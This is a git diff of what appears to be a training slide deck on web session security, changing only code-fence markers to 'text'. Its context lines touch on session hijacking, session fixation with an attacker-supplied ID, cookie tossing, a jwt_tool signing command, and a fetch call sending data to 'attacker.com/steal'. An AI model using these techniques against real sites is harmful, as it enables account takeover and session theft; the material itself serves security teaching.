@@ -12,7 +12,7 @@ paginate: true
 
 ## How Sessions Work
 
-```
+```text
 1. User authenticates (login)
 2. Server creates session and stores state
 3. Server sends session ID to client (usually as cookie)
@@ -59,7 +59,7 @@ def generate_session_good():
 
 ## Session Hijacking Techniques
 
-```
+```text
 +---Attack Vector-----------+---Method----------------------+
 | Network sniffing          | Capture session cookie on     |
 |                           | unencrypted connection        |
@@ -115,7 +115,7 @@ fetch('https://attacker.com/steal', {
 
 ## Session Fixation Attack
 
-```
+```text
 Attack flow:
 1. Attacker gets a valid session ID from the server
    GET /login -> Set-Cookie: session=ATTACKER_SESSION
@@ -214,7 +214,7 @@ Set-Cookie: session=abc123; SameSite=Strict
 
 ## Session Token Analysis with Burp Sequencer
 
-```
+```text
 Steps to analyze session token quality:
 
 1. In Burp, capture a request that returns a session token
@@ -382,7 +382,7 @@ def dashboard():
 
 ## Session Storage Comparison
 
-```
+```text
 +--Storage--+--Security--+--Scale--+--Speed--+--Notes--------+
 | Memory    | Good       | Poor    | Fast    | Lost on restart|
 | File      | Moderate   | Poor    | Moderate| Disk I/O       |
@@ -470,7 +470,7 @@ python3 jwt_tool.py eyJhbGciOiJI... -S hs256 -p "secret_key"
 
 ## Cookie Tossing Attack
 
-```
+```text
 Cookie Tossing: Set cookies from a subdomain
 that override the parent domain's cookies
 
